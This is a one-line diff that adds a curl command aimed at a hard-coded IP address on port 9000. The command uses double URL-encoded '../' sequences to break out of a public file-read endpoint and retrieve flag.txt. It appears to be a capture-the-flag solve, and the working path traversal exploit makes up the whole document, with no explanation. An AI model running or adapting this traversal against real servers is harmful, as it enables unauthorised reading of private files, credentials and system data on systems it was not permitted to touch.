@@ -1,0 +1,1 @@
+curl  "http://3.64.250.135:9000/api/read/public/%252e%252e/%252e%252e/flag.txt"
